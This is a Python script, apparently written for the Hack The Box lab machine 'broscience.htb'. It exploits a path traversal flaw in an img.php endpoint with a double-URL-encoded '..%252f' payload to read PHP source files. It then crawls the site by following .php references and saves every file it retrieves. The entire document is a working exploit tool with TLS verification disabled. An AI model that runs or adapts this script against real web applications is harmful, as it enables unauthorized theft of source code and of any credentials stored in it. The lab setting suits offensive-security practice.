import requests
import urllib3
import re
from pathlib import Path

urllib3.disable_warnings()

queue = ["index.php"]
seen = []

url = 'http://broscience.htb/includes/img.php?path=..%252f'

def save_file(name,contents):
    
    if '/' in name:

        fdir = Path(name)
        Path(fdir.parents[0]).mkdir(parents=True, exist_ok=True)

    with open(name, 'wb') as f:
        
        f.write(contents)

while len(queue)!=0:

    for page in queue:
    
        queue.remove(page)
        seen.append(page)

        r = requests.get(url + page,verify=False)
        save_file(page,r.content)
        pages = re.findall(r"['\"]([a-zA-Z0-9-_/]*.php)",r.text)

        for i in pages:
            
            if i not in seen and i not in queue:
            
                if i[0] == "/":
                    i = i[1:]
            
                queue.append(i)